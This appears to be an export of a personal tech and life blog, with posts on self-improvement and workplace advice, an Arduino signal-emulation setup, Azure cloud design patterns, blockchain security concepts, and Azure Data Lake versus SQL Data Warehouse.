针对这样的情况分析，你采用了什么行动方式 Result: 结果怎样，在这样的情况下你学习到了什么 简而言之，STAR法则，就是一个清晰、条理的作文模板。 不管是什么，合理熟练运用此法则，可以轻松的对面试官描述事物的逻辑方式，表现出自己分析阐述问题的清晰性、条理性和逻辑性\nHourly rate Your annual salary / 2,080 hours = your hourly rate\nThen decide how to invest your time with hourly rate in mind. Always look for ways you can spend some money to save time\nBecome the 1% Do what the 1% does. Success leaves clues. It’s not a mystery or an enigma. It’s a formula that anyone can follow. The only problem? It’s REALLY F*\u0026amp;%$^G Hard!\nThey Value Education Over Entertainment They value education and constant growth. They read every single day. They attend seminars. They hire coaches. If they watch television or play video games, they do so in a strategic manner designed to help them recharge, not to distract themselves from the tasks at hand. I’ve never met someone who reads nonfiction books everyday for 30–60 minutes and isn’t wealthy. (With the rare exception of individuals who read all day but never take action.) If you want to join the 1%, then this is where you start. Double down on your education. Learn about sales, marketing, psychology, high performance, productivity, business systems and finance. Put down the remote and pick up a book. It changed my life and it will change yours too.\nThey Have a Plan and Stick to It One of the key habits that differentiates high performers (1%’ers) from the rest of the population is that they are proactive instead of reactive. Every night, they write out what they accomplished that day and what their plan is for the following day. They have a clear list of priorities that they plan to accomplish. They wake up before they need to, spend a few minutes exercising, reading, journaling and meditating before going to work or building their business. When they start their day, they know exactly what needs to be done and why. They methodically move through their most valuable priorities, avoiding distractions like email, social media and water cooler talk. When the day ends, they’ve accomplished at least one or two of their biggest priorities and they learn from their mistakes so that they can avoid making those mistakes the next day.\nStart by writing out a plan for the next 5 years of your life and figure out exactly what you want to accomplish. Based on that document, plan for every day the night before. Put your gym clothes, journal and books somewhere they are easy to access and move your alarm across the room so that you can’t hit snooze. This simple shift will radically alter your days and put you in a state of proactivity vs. reactivity.\nThey Invest Their Money In Themselves and Other Appreciating Assets Poor people spend money. Rich people invest. They simply invest their money into appreciating assets… Namely, themselves. 1%’ers are notorious for spending lavishly on their own personal development and performance. They will spend thousands (sometimes millions) of dollars on advanced training, high performance coaching, books, seminars, and lectures. They invest in high quality supplements and a healthy diet that allows them to have high energy and enthusiasm throughout the day. If you want to join the 1% then you must stop spending your money on pointless crap that doesn’t serve you.\nThey Work On the Right Things Poor people work on whatever is in front of them; rich people work on what’s most important to them. They don’t work on the things that are easy. They work on the things that will get them results. They know the power of saying “No” to things that don’t serve their ultimate vision and they have laser focus on their #1 most important goal.\nThey Lay One Brick a Day 1%’ers operate by a philosophy known as “Kaizen” which loosely translates to “Small daily improvement”. They don’t try to change everything all at once. They are patient. They lay one brick a day. They know that it’s the tiny actions (not the grand leaps) that determine a person’s destiny. They understand the power of the compound effect. 1% compounded over ten years is a 3,650% improvement. That’s the difference between earning $100,000 a year and earning $3.6 million a year. Tap into this power and your life will change forever… IF you play the long game.\nThey Play the Long Game 1%’ers understand that life is a game played in years and decades, not months. They have goals for the next 30 and 90 days, yes. But they are more considerate of the next decade and how their actions today will impact them 10, 20, 30, and 40 years from now. They act with a sense of urgency, but they don’t expect results to come quickly. They simply take small daily actions everyday knowing that one day, the results will compound and they will have the life of their dreams.\nThey Value the Power of Networking 1%’ers have allies. The 99% have friends. Rich people understand the value of networking and giving value to others with no expectation of anything in return. They intentionally build a network of people who are better than they are in their field. People who make them uncomfortable and insecure. People who challenge them to rise above mediocrity and achieve a life of success and integrity.\n最后，你的身材，你的外形是你最好的名片。好好打理自己的名片\n为人处事 怼人 遇到让自己不爽的事情，想要怼怼别人的时候，先把自己要说的话写下来，就当对面就是那个让自己很不爽的人。 写好后，放在一边，不发出去，让自己去做其他的事情。过几个小时再回来，这时候，你可能会奇妙地发现，自己的怒气减少了很多，再去看刚才写的文字，会觉得很多不妥的地方。 因为你再回来的时候，已经怒气全无，还会庆幸自己亏得没有发这些内容，不然多年的情谊可能就没了。 即使对方原谅了你，但是疙瘩已经结下了，要知道冤家宜解不宜结啊。\n关于舒服的沟通 如果两人相处，对方让你感觉各方面都很舒服，很有可能对方在智商和情商各方面都在你之上。\n这时候需要提起精神，好好想想该如何学习和提高。\n不要和层次不同的人争辩 那是对自己的一种无益的损耗。 这并不意味着软弱或退让，而是当你耗尽了精力，却难以消除人与人之间的认知差距。 你不可能用辩论击败无知的人。 对于层次不同的人，我们不必刻意相融，也不必试图去改变对方，只需待在各自的圈层内，结交一些气味相投、有着相同价值观的人，这样的人生，完全足矣。\n联系老朋友 隔一段时间和好久不联系的朋友问候几句。\n所以养成了这个习惯，主动去问候一下朋友们，问问他们最近怎么样了，也方便下次需要朋友帮忙的时候，显得没那么陌生。\n当然目的也不能太功利\nBecome interesting I think someone is boring only if they themselves think they are uninteresting. These people do not know how to frame things in the right way. Every aspect of life is a story.\nScenario 1\nHey, good seeing you, it's been forever! How was your weekend? It was okay. What did you do? Nothing really. Same old. OR Scenario 2\nHey, good seeing you, it's been forever! How was your weekend? I did absolutely nothing. I managed to stay in bed for 40 out of 48 hours. Record! How'd you manage that... etc. etc. Don't think you aren't interesting. You are. Everyone is. Life is a story, and as long as you can tell it right, no one can disagree.\nCool psychological hacks Stay relaxed at your mistakes. So that people do not take them too seriously. Say let me check that. Whenever you don't have an info/ update for boss's questions instead of staring at him blankly ; pretend to be precise. You may tell” I’ll check that” with a serious sincerity. First draft should be simple. Let the boss exercise his passion to reject or correct. Your second draft will be accepted quickly. Self care reflects your self respect. Pay special attention to your personal hygeine, dressing, looks, body language and style. It reveals more than you tell. Never appear to be too perfect: “(People don’t care about those they can not identify with. Stop trying to prove yourself God’s Gift to the organization.)” Say less than required. “( They will definitely ask for more if needed.)” Show respect and care. This is the tried and tested way to win people’s hearts. They love to be taken seriously. Make your work seem effortless. “(Instead of showing how much you exert at work make your achievements seem effortless. Soon you will be rewarded with greater projects.)” Boss is always right. Proving him wrong by any logic reflects you are smarter than him ; he will never forgive you for that. Of course there can be exceptions but generally they are like that. Attitude matters. Whether you can do it or not there is no harm in saying yes to any assignment. Reservations can be discussed later. Nobody needs a superman but everybody desires a sweet, humble and agreeable gentleman. 生活哲理 关于体育 长期的安逸和舒适，削减了我们应对变化环境的能力，我们身边一切让生活变得更便利的东西：网购、外卖、空调，都在试图让我们逐渐依赖现代文明的保障。 这种保障在不知不觉中夺走你的体能，同时也会将你的意志力一并打包带走。 体育运动真正的价值和意义，在于引导人们不断尝试新的极限，挑战原本被认为不可能的事情。 生活的意义，就是挑战极限，与自己作斗争，不断的提升自己的能力边界和上限；毕竟，即便是享受生活，也需要强健的体魄。 不要让体力，成为你从未预料的那块最短的木板。\n关于各种人 年少时，很少去想各种人对于生活的重要性。 其实在成长路上，各种人都是不能避免的，也有其相应的作用。\n高人指路 贵人相助 小人监督 敌人成就 其它有意思的语句 你现在的气质里，藏着你读过的书，走过的路和爱过的人\n你是砍柴的，他是放羊的，你和他聊了一天，他的羊吃饱了，你的柴呢？\n一个不成熟的人的标志是他愿意为了某个理由轰轰烈烈地死去，而一个成熟的人的标志是他愿意为了某个谦恭的理由活着。 ——塞林格《麦田里的守望者》\n备考就像黑屋子里洗衣服，你不知道洗干净没有，只能一遍一遍去洗。 等到上了考场的那一刻，灯光亮了。 你发现只要你认真洗过，那件衣服光亮如新，而你以后每次穿上那件衣服都会想起那段岁月\n失去的东西，其实从来未曾真正地属于你，也不必惋惜。 ——玫瑰的故事\n人的一切痛苦，本质上都是对自己的无能的愤怒。 ——王小波\n哪里会有人喜欢孤独，不过是不喜欢失望罢了。 ——村上春树挪威的森林\n之后的二十年，你更可能因为那些你没有去做的事情而后悔，而不是因为那些你做了的事。 所以，扔开绳索，从安全的港口出发，在航行中遭遇信风、探索、梦想和发现。 ——马克·吐温\n一个人知道自己为什么而活，就可以忍受任何一种生活。 ——尼采\n我年青时以为金钱就是一切，而今年事已迈，发现果真如此。 ——奥斯卡.王尔德\n做你自己，因为别人都有人做了。 ——王尔德\n人会有三次成长\n第一次是在，发现自己不是世界中心的时候； 第二次是在，发现即使再怎么努力，终究还是有些事令人无能为力的时候； 第三次是在，明知道有些事可能会无能为力，但还是会尽力争取的时候。 人一到群体中，智商就严重降低。为了获得认同，个体愿意抛弃是非，用智商去换取那份让人倍感安全的归属感。 ——勒庞乌合之众\n受人之恩不要忘，与人之恩不要提。 ——日本寺院\n如果不知道一句话是否当讲，那就闭嘴别讲。\n当别人在劝你接受一件事的时候，应该要做到嘴上多肯定，心里多否定。\n以你的努力程度，还轮不到拼天赋。\nYou will never reach your destination if you stop and throw stones at every dog that barks\nWinston Churchill 个人提高 思维升级 而真正能够帮助你减肥的，不是管住嘴，而是借助饮食，运动的规律性来加速你的新陈代谢率。 真正能让你摆脱工作负循环的，不是加班加点的穷忙，而是懂得做好计划，提升能力，辨别事情的轻重缓急。 其实，一个人对于时间的认知，往往决定了升维思考的高度。 当把思考架构于时间之上，我们的思维视角就提升到了一个新的高度。\n行动力 比如我下周一开始，或者我明年再开始这样的意识，告诉自己一定要立马行动，行动力往往就拉开了你和别人的差距，所以，告诉自己一定不要拖延 睡前你可以对自己一天中所做的事情进行反思，今天哪些地方做的很好，哪些地方还有待欠缺，哪些事情影响了自己的心情，浪费了自己的时间，然后用一句话对自己所做的事情进行一个小结\n遇到不知道的就立刻去查资料，遇到感兴趣的也是\n「两分钟法则」：如果一件事能在两分钟之内决定并完成，那就立即着手去做，不要犹豫\n作品意识 当我们通过积累、刻意练习出现一些效果的时候，你要学会把练习变成一种输出，也就是作品意识 现在是分享时代，不断积累和输出，既是对自己的一个督促，也是在等待机会到来时的一种储备\n费曼学习法 第1步，学习一样新东西之后，用尽可能简单的语言解释给小孩听，或者对相关课题不了解的朋友听 第2步，找出别人听不懂的地方，或者是你本身无法简单解释的概念 第3步，回到学习资源，重新学习你的弱点，意识到能够简单地解释清楚为止 第4步，重复以上三个步骤，一直到你完全熟练相关的课题为止 Dunning Kruger Effect 很多时候没，人们总是忽视学习新领域的难度，同时又低估了日积月来实践带来的成果。 Dunning Kruger Effect 很好地解释了这点。\n关于持续学习，需要进入一种沉浸状态Flow。解决的问题需要根据自己当前的能力进行调整。\nPresentation 10-20-30 rule Guy Kawasaki's 10-20-30 Rule.\n10 Slides 20 Minutes to deliver the presentation 30 is the minimum font size you are to use. 教育 The most important things you can teach your child are:\n1-5 years old don't be afraid to try new things, even when you fall, I'll be there to catch you be nice to others say \u0026quot;thank you\u0026quot;, and \u0026quot;sorry\u0026quot; when needed I'll always be there for you, you can count on that 5-15 years old mean words can hurt, use them carefully nice words can make people feel better, learn those words don't succumb to being bullied don't become a bully don't sell your integrity for popularity not everyone can be trusted, learn about those dangers in the world I'll be there for you no matter what I trust your word more than anybody else's words developing core values for life power of decision, perseverance, delayed gratification, diligence, kindness, goodness 16 to 25 year old how to make great decisions how to recognize, admit, correct own life mistakes how money works value of faith in ones life recognizing other's intentions living by your core values believing in yourself value yourself respect yourself respect others, but don't let them think that they take advantage of you don't be fooled by people's words, watch their actions live with integrity using your talents to enrich the world finding your place in the world becoming independent thinker and doer using discernment in life prioritizing difference between good and bad not letting emotions rule your life acknowledging what's good and what's bad in own life, taking appropriate steps remember, that you are not alone, I'll be there when you need me, but at times for the sake of learning life, I'll let you pull yourself up by your own boot strings Written by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/intelligent_web_sentences/","section":"post","tags":["career"],"title":"Intelligent Web Sentences"},{"body":"Arduino Introduction Published: May 16, 2020 Tags: iot, hardware Category: ComputerScience\nRecently, my recent project use Arduino and relevant devices to help to emulate signals from sensors. It helps our development quite a lot especially the 'up-stream' part like data acquisition. The setup looks like following, which just shows very small part of the whole setup and this setup is evolving no matter the hardware and the software. Due to confidential consideration, this article will only stay on high level.\nTable of Contents Project Introduction Our main solution is an IoT project for vessel to help optimize operation. So we start this project to emulate the sensor signals from the vessel, which allows the development team to ease the development without access to the vessel. This project is very helpful for the crucial part e.g. data acquisition. The setup looks like following picture:\nThere are several parts:\nSlide pot Arduino DAC Breadboard Slide pot On real vessel deployment, one crucial parameter is the fuel rack position which indicate the rpm, and have big impact to the rest of the solution.\nWe use slide pot device to emulate the fuel rack. And we can change the bar position of the slide pot to emulate the change of the fuel rack position. This change will impact all the following signal generation like cycle length, rpm and pressure amplitude just like the vessel.\nArduino Arduino boards are used to generate signals. Arduino is uC.\nuC means microController (MCU). In modern terminology, it is similar to, but less sophisticated than, a system on a chip (SoC); a SoC may include a microcontroller as one of its components. As for system on a chip, that is a less well defined term. These are basically a microcontroller with small FPGA on the same chip. Instead of having built in peripherals, you can make whatever you want within the available resources of the FPGA.\npinout The first step is to understand the board functionality by reading pinout like following.\nBased on the project needs, we look into the pinout and decide how many pins to use, also GND pin.\nI2C I2C (Inter-Integrated Circuit) computer bus\nwidely used for attaching lower-speed peripheral ICs to processors and microcontrollers in short-distance, intra-board communication. I2C is appropriate for peripherals where simplicity and low manufacturing cost are more important than speed. Standard I2C devices only run at 100 kHz.\nSCL and SDA pins are I2C pins.\nSCL stands for Serial CLock. SDA stands for Serial DAta. Arduino development The first step of Arduino development is to install Arduino IDE. Once the IDE is installed, it is quite straight forward to configure library and board type in the IDE settings.\nAnd the focus area for the coding is two methods:\n1 setup() 2 loop() There are plenty of resources online to describe the basic programming part of Arduino.\nFor our project, we generate both analog and digital signals.\n1 writeDigital() Debugging There are ways to help your development, one is serial output.\nanother one is Saleae Logic device\nOnce you connect the Saleae Logic to the Arduino output pins, you can see the signals on the Logic UI. The following picture is just an example. The UI is highly configurable and also straight forward to use for debugging purpose.\nDAC DAC means digital analog convert, d means digital, a means voltage/current. 数字模拟转换器（英語：Digital to analog converter，英文缩写：DAC）是一种将数字信号转换为模拟信号（以电流、电压或电荷的形式）的设备。 模拟数字转换器（ADC）则是以相反的方向工作。 典型的数字模拟转换器将抽象数转换为具体的脉冲序列，然后利用插值法输出近似连续的量。 其他的转换方法（例如基于ΔΣ调变的方法）则产生脉冲密度调制（Pulse-density modulation, PDM）进而产生平滑的连续信号。\nAnalog-to-digital conversion A PDM bitstream is encoded from an analog signal through the process of delta-sigma modulation. This process uses a one bit quantizer that produces either a 1 or 0 depending on the amplitude of the analog signal. A 1 or 0 corresponds to a signal that is all the way up or all the way down, respectively. Because in the real world, analog signals are rarely all the way in one direction, there is a quantization error, the difference between the 1 or 0 and the actual amplitude it represents. This error is fed back negatively in the ΔΣ process loop. In this way, every error successively influences every other quantization measurement and its error. This has the effect of averaging out the quantization error.\nDigital-to-analog conversion The process of decoding a PDM signal into an analog one is simple: one only has to pass the PDM signal through a low-pass filter. This works because the function of a low-pass filter is essentially to average the signal. The average amplitude of pulses is measured by the density of those pulses over time, thus a low pass filter is the only step required in the decoding process.\nIn our project, we use DAC device with multiple channels to output analog signals.\nBreadboard A breadboard is a construction base for prototyping of electronics. It plays as 'glue' role in the project, and it connect different devices.\nFor example, all electric wires are connected if they are on the same row (with same number). At meantime, positive wire and gnd wire can be easily put on +/- columns.\nBreadboard is very helpful when you use many devices to connect to each other to achieve some complicated logic.\nThis is a very simple introduction about what we do for signal generation for our project.\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/arduino_introduction/","section":"post","tags":["iot","hardware"],"title":"Arduino Introduction"},{"body":"","link":"http://localhost:1313/tags/hardware/","section":"tags","tags":null,"title":"Hardware"},{"body":"","link":"http://localhost:1313/tags/iot/","section":"tags","tags":null,"title":"Iot"},{"body":"China 70 Anniversary Big Data Published: Mar 15, 2020 Tags: chinese Category: General\nThe series of pictures show the progress of China development within 70 years. It is amazing!\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/china_70_anniversary_bigdata/","section":"post","tags":["chinese"],"title":"China 70 Anniversary Big Data"},{"body":"","link":"http://localhost:1313/categories/general/","section":"categories","tags":null,"title":"General"},{"body":"","link":"http://localhost:1313/tags/architecture/","section":"tags","tags":null,"title":"Architecture"},{"body":"Azure Design Pattern Published: May 01, 2020\nTags: cloud, architecture\nCategory: ComputerScience\nJust like programming, for many technical challenges for using cloud and Azure there are best practices. We call these best practices as Design Pattern. This blog introduce these design patterns and also discuss relevant tools on Azure.\nTable of Contents Introduction Data Management and Performance Event sourcing Sharding Pattern Static Content Hosting Pattern The Cache-aside Pattern CQRS pattern Availability and resilience Circuit Breaker Pattern Compensating Transaction Pattern Health Endpoint Monitoring Pattern Queue-based load levelling pattern Retry pattern Throttling Pattern Design and Implementation External Configuration Store Pattern Federated Identity Pattern Gatekeeper Pattern Runtime Reconfiguration Pattern Valet Key Pattern Resources Introduction We categorize the design patterns into followings:\nDesign and Implementation\nExternal Config Store Federated Identity Gatekeeper Runtime Reconfiguration Valet Key Data Management and Performance\nAutomatic Scaling Cache-aside CQRS Event sourcing Sharding Static content hosting Availability and resilience\nCircuit breaker Compensating transaction Health endpoint monitoring Queue-based loading levelling Retry Throttling Data Management and Performance Event sourcing The problem with storing the current state of the data\ndirect CRUD operations slow down Performance data conflicts shaping data is difficult The Event Sourcing Pattern\nThings to consider:\nGet the current state by replaying events for an entity (id) Event sequence Event version Backup/restore/retention Append only Lag in publishing and processing events will cause eventual consistency Event consumers should only process events once Event sourcing is complex to implement Possible framework: NEventStore -\u0026gt; open source event store\nSharding Pattern The problem with having a single database\nscaling your database up (more resources) isn't sufficient data needs to be stored in specific geographics regions Possible framework: Elastic DB Tools for Azure\nStatic Content Hosting Pattern When to use this pattern:\nincrease application Performance decrease resource costs increase content availability Things to consider:\ndesign a deployment strategy - for application and content should only be accessible to the target audience use https where possible secure the content (valet key token) for more advanced capability - use a content delivery network (CDN) Azure CDN\nAzure CDN profile Azure blob storage website points of presence (POP) The Cache-aside Pattern Pick the right data to be cached\nsimple data data that is needed often and doesn't change often Things to be considered:\nConsistency isn't guaranteed by the pattern data can be changed by other processes most caches have expiration policies balance between performance and consistency to optimize performance, pre-populate the cache and pick when data to pre-populate About Azure Redis Cache\ncache-as-a-service in-memory data structure store recommended cache to use with Azure based on the open source redis platform highly available (99.9%) key/value structure publish/subscribe premium features data persistence redis cluster CQRS pattern The problem with mixing reads and writes\nsimulaneous transactions lead to data contention and conflicts services and data sources and expensive to scale security isn't granular CQRS pattern looks like following:\nAvailability and resilience Circuit Breaker Pattern Non-transient failures Retrying will waste resources Waiting on a timeout also wastes resources Can change the state to half-open:\nAmount of errors Type of errors After a predetermined time Open source library -\u0026gt; polly: https://github.com/App-vNext/Polly/wiki/Circuit-Breaker\nCompensating Transaction Pattern reverting failed steps in distributed system is difficult\nHealth Endpoint Monitoring Pattern Technical challenges:\nMonitoring tools are too simple The system doesn't provide enough information Possible solutions:\nAzure Monitor Azure Advisor Azure Resource Health Azure Network Watcher Security Center Application Insights Operation Management Suite Queue-based load levelling pattern The problem with calling services directly\nNot scalable Diminish availability Growing costs Possible solution: Azure storage queue\nRetry pattern Azure storage has retry policy by default\nThrottling Pattern To handle sudden increases in traffic To guarantee application uptime To prevent specific users or tenants from overloading the application Possible solution: API management\nDesign and Implementation External Configuration Store Pattern Technical challenges:\nConfiguration is part of the deployment Multiple applications use the same configuration Hard to control access rights When to use pattern\nShare configuration Manage configuration centrally Audit configuration access Azure Key Vault\nStores (Certificates, Keys, Secretes) Logging Highly available Backed-up Federated Identity Pattern Why:\nSingle sing-on Authenticate 'external' users B2B \u0026amp; B2C Different tenants, different IDPs Azure Active Directory\nIdentity as a service Authentication Multi-factor authentication Advanced threat detection Gatekeeper Pattern Azure Gateway -\u0026gt; only expose things necessary\nThings to consider:\nSensitive information, in a high security environment Distributed system where you need centralized filtering and monitoring However, performance impact of gateway may be high Runtime Reconfiguration Pattern Things to consider:\nExternal configuration Get changes: use the hosting environment to subscribe to changes; poll for changes Apply changes: apply changes at runtime; restart only when needed .net core has the support\nValet Key Pattern Resources https://github.com/bmaluijb/CloudDesignPatterns\nhttps://docs.microsoft.com/en-us/azure/architecture/patterns/\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/azure_design_pattern/","section":"post","tags":["cloud","architecture"],"title":"Azure Design Pattern"},{"body":"","link":"http://localhost:1313/tags/cloud/","section":"tags","tags":null,"title":"Cloud"},{"body":"","link":"http://localhost:1313/series/2019/","section":"series","tags":null,"title":"2019"},{"body":"","link":"http://localhost:1313/tags/blockchain/","section":"tags","tags":null,"title":"Blockchain"},{"body":"Cyber Security for Blockchain Published: Jun 09, 2019 Tags: blockchain, security Category: ComputerScience\nThis year, I worked on a project and the topic for me is cyber security for blockchain in Oil and Gas industry. It was really good experience since I got the chance to think through this topic and deliver research report to client. Both cyber security and blockchain are interesting areas for me, besides the above project I still have a lot of things not mentioned mainly technical things. So I decide to write this blog as supplement to above project.\nTable of Contents Blockchain allows people to exchange assets and perform transactions without a third party. In order to compromise or hack a blockchain network, someone would have to gain control of the majority of computers in that network. This is extremely difficult to do which is guaranteed by Blockchain.\nTo simply say Blockchain is safe and can protect your data is wrong, since the strength of Blockchain can only cover security from one perspective.\nThe blockchain is an incorruptible digital ledger of economic transactions that can be programmed to record not just financial transactions but virtually everything of value Don and Alex Tapscott: Blockchain Revolution\nStrength There is no longer a single point of failure, and this is what makes blockchain infinitely more secure than what we have today. Blockchain isn't just for assets, though. It extends to contracts.\nAnd also, along with that, understand that we only have two possible operations on blockchain: we can only read data and we can only add new data. There's no concept of an edit or delete, and this is what we talk about when we talk about immutability on the blockchain.\nA block cannot be forged or modified, because it is digitally signed by the creator. The creator of a block is either publicly known (Proof of Stake) or difficult to become (Proof of Work), making masquerading as the real creator difficult or impossible.\nBlockchain Platform Status private blockchain, and the most common ones are R3 Corda, Hyperledger, and Quorum.\n• Ethereum Ethereum currently does not have any advanced privacy options, but this is planned to change. • Hyperledger\nChannels: Subsections of the blockchain that make transactions visible only to members. Private Transactions: Hashes of private data are stored to publicly verify it on the blockchain. Zero-Knowledge Technology: Provers can demonstrate knowledge of a secret without revealing the secret itself. • Corda Parties on the Corda Network can be represented in one of two ways: Party: A public key and name Anonymous Party: Only a public key. Ethereum currently uses Proof of Work for consensus. And Casper is the planned migration of Ethereum from Proof of Work to Proof of Stake.\nAzure, blockchain as service\nTEEs (Trusted Execution Environments)\nHyperledger\nMicrosoft Coco Framework\nR3 Corda (finance and bank)\nJP Morgan Quorum\nEthereum vs Hyperledger The use of public keys for identity management is a logical choice since knowledge of a public key is necessary for verification of digital signatures. Both Ethereum and Hyperledger Fabric use digital signatures on transactions and blocks to verify the identity of the creator and that the signed data has not been modified since signing. Public key cryptography is used in the blockchain as a method for managing users’ identities without revealing real world identities. In Ethereum, users are identified by an address that is directly related to the user's public key. This provides identity verification while preserving anonymity. In Hyperledger Fabric, users are identified via X.509 certificates. These certificates provide several pieces of information about the user, but one of these is also the user's public key. Zero-knowledge proofs are a cryptographic principle used in some blockchains to increase the privacy of users. Currently, Ethereum does not have support for zero-knowledge proofs, but adding the necessary functionality for zkSNARKS, a type of zero-knowledge proof, is currently included in the Ethereum development roadmap. Hyperledger Fabric does not currently support zero-knowledge proofs as a privacy feature.\nHash functions are at the core of all blockchain technology. One of the primary uses for hash functions is chaining blocks together. In both Ethereum and Hyperledger Fabric, blocks include the hash of the previous block to tie the blockchain into a cohesive whole. Merkle trees are a data structure that allows authenticated storage with efficient data retrieval. Both Ethereum and Hyperledger Fabric are smart contract platforms that use a particular type of Merkle tree called the Patricia tree to store the current state of their virtual machine. Hash functions are used as the cryptographic puzzle at the center of the Proof of Work consensus algorithm. Ethereum currently uses Proof of Work for consensus, though a switch to Proof of Stake has been built into the road map from the beginning. There are only two consensus alogrithms implemented in Hyperledger Fabric - Solo and Kafka. SOLO is for development and Kafka is for production.\nSecurity Roles in Blockchain Ethereum Wallets - Do not store any money - Stores cryptographic keys -\u0026gt; key store - Multiple implementations\n○ Cli ○ Desktop ○ Browser ○ Mobile app\nEthereum Accounts - Bank account\nIssued by a bank Used for payments Can be restored by a bank Can be suspended by a bank - Ethereum account Can be created by any user at any time Can be used to access Ethereum apps Cannot be restored if access is lost Cannot be suspended or censored\nIdentity So, when you're thinking in your head about public versus private blockchain understand that it all begins with identity management, and in a private blockchain I know who all the participants are right from the beginning. In the public blockchain, again, I don't know who those participants are, and that's not to say that I can't build a permission solution on a public platform,\nconsensus https://blog.csdn.net/lsttoy/article/details/61624287\nThe blockchain is built of several different types of components, each with a specific role to play within the blockchain’s operation:\nLedger: A distributed, immutable historical record Peer Network: Stores, updates, and maintains the ledger Membership Services: User authentication, authorization, and identity management Smart Contract: Program that runs on the blockchain Wallet: Stores users' credentials Events: Notifications of updates and actions on the blockchain Systems Management: Component creation, modification, and monitoring Systems Integration: Integration of blockchain with external systems.\nPotential Problems https://brokenlibrarian.org/bitcoin/\nDouble spending Sending a digital copy concept it's not so great when it comes to things like money, stocks and bonds, music, loyalty points, intellectual property, tickets to a game or concert.\nSolutions Can use Azure KeyVault to store the key and do block versioning\nDo you need a blockchain?\nDo you need a shared database between multiple parties Do the parties have conflicting interests or are not trusted Can everyone play by the same rules? Do you need an immutable log? Public blockchain or private blockchain\nBitcoin uses Merkle tree while Ethereum use Patrica tree Ethereum moves to proof of stake: Casper\nEthereum code is public: Can be examined Can be validated Can be exploited if poorly written, e.g. the DAO\nDapp advantages Reduces fees Reduces reliance on central resource DDoS free Removes personal trust from the transaction\n","link":"http://localhost:1313/post/2019/cyber_security_for_blockchain/","section":"post","tags":["blockchain","security"],"title":"Cyber Security for Blockchain"},{"body":"","link":"http://localhost:1313/tags/security/","section":"tags","tags":null,"title":"Security"},{"body":"","link":"http://localhost:1313/archives/","section":"","tags":null,"title":""},{"body":"Azure Data Lake and Warehouse Published: Apr 30, 2019 Tags: cloud Category: ComputerScience\nData Lack and Data Warehouse are two concepts causing confusion. This blog introduces these two concepts and provides comparision for other relevant concepts.\nIn general, there is a good article: https://www.talend.com/resources/data-lake-vs-data-warehouse/\nTable of Contents Data Lake Analyzing Big Data in Azure\nData Lake Store: No limits data Lake Data Lake Aanlytics: Analytics job service HDInsight: Managed clusters Azure Data Lake Store Hyper-scale repository for your big data analytics.\nWebHDFS compatible Any size Any format as-is Write-once-read-many Enterprise-grade security The big data store in Azure Data lake store is mainly for cold data.\nAzure Data Lake Analytics Run big data analysis jobs that scale to massive data sets.\nRun analytics jobs on managed clusters: No maintenance Serverless Written in U-SQL: SQL Syntax and Extensibility in C# Easily scaled with Analytics Units Pay for processing time only Data Sources\nBuilt-in partitioned tables Query data where it lives, No need to prepare data One query that runs on multiple data stores Use the correct data store for the job Basic Data Lake Analytics process:\nCreate a Data Lake Analytics account. Prepare the source data. Data Lake Analytics jobs can read data from either Azure Data Lake Store accounts or Azure Blob storage accounts. Develop a U-SQL script. Submit a job (U-SQL script) to the Data Lake Analytics account. The job reads from the source data, process the data as instructed in the U-SQL script, and then save the output to either a Data Lake Store account or a Blob storage account. \u0026quot;Mastering Azure Analytics\u0026quot; by Zoiner Tejada: http://shop.oreilly.com/product/0636920050568.do\nU-SQL Documentation: https://usql.io\nU-SQL is a language that unifies the benefits of SQL with the expressive power of your own code to process all data at any scale. U-SQL’s scalable distributed query capability enables you to efficiently analyze data in the store and across relational stores such as Azure SQL Database. It enables you to process unstructured data by applying schema on read, insert custom logic and UDF's, and includes extensibility to enable fine grained control over how to execute at scale.\nCode example:\n1\t@searchlog = 2EXTRACT UserId int, 3 Start DateTime, 4 Region string, 5 Query string, 6 Duration int?, 7 Urls string, 8 ClickedUrls string 9FROM \u0026#34;/Samples/Data/SearchLog.tsv\u0026#34; 10USING Extractors.Tsv(); 11\tOUTPUT @searchlog 12TO \u0026#34;/Output/SearchLog-from-Data-Lake.csv\u0026#34; 13USING Outputters.Csv(); Azure Data Lake GitHub Repo:\nhttps://azure.github.io/AzureDataLake/\nSQL Data Warehouse Azure SQL Data Warehouse is a scale out database service designed to answer your ad hoc queries and questions. By spreading your data across distributions SQL Data Warehouse is designed for analytics at scale. To make the most of your database there are opportunities to tailor your table design and optimize for performance.\nBuilt on SQL server engine. It is SQL on SQL.\nPolyBase Polybase is to simplfy and enable distributed analytics.\nPolybase allows you to leverage your data from different sources by using familiar T-SQL commands. Polybase enables you to query non-relational data held in Azure Blob storage as though it is a regular table. Use Polybase to query non-relational data, or to import non-relational data into SQL Data Warehouse.\nPractices If the data is less than 1 TB, it is not a big data problem. Use SQL server directly.\nYou can pause the data warehouse, then not charge anymore\nDistribution mode: round_robin(random), or on a key using hash. (check the row count to see whether the distribution is even)\nOLAP and OLTP Data Warehouse (or OLAP) workload is very different than online transaction processing (OLTP) workload with very different indexing strategy and data access pattern.\nUnsuitable workloads: Operational workloads (OLTP)\nHigh frequency reads \u0026amp; writes Large numbers of singleton selects High volumes of single row inserts On the other hand, traditionally data warehouse workloads are write once and read many times.\nGood links:\nhttps://azure.microsoft.com/en-us/documentation/articles/sql-data-warehouse-overview-what-is/#data-warehouse-units\nhttps://azure.microsoft.com/en-us/documentation/articles/sql-data-warehouse-load-polybase-guide/\nhttps://techcommunity.microsoft.com/t5/DataCAT/Azure-SQL-Data-Warehouse-Workload-Patterns-and-Anti-Patterns/ba-p/305472\nComparision Data Warehousing vs Data Lakes Data Warehousing\nStructured data Defined set of schemas Requires Extract-Transform-Load (ET L) before storing Exploratory analysis is hard because of transforming the data Data Lakes\nRaw data (unstructured/semi-structured/structured) \u0026quot;Dump\u0026quot; all your data in the lake Data scientists will interpret data from the lake Without metadata, turns in a data swamp pretty fast Azure Data Lake Store vs Blob Storage No Limitations Store whatever you want in any format Redundancy: It's there but no control over it Security Built-in Azure Active Directory support Built for Scale Optimized for high- scale reads Pricing More expensive than Storage GRS Integration With Data Factory, Data Catalog \u0026amp; HDlnsight Azure Data Lake Analytics vs HDInsight HDInsight the developers need to care about the clusters.\nAzure data lake analytics developers just like Uber -\u0026gt; USQL.\nVery good support from Visual studio compared to hadoop, hive directly. Visual studio can support playback the execution.\nAzure Data Lake vs Azure Data Factory Azure Data Lake (ADL) makes processing 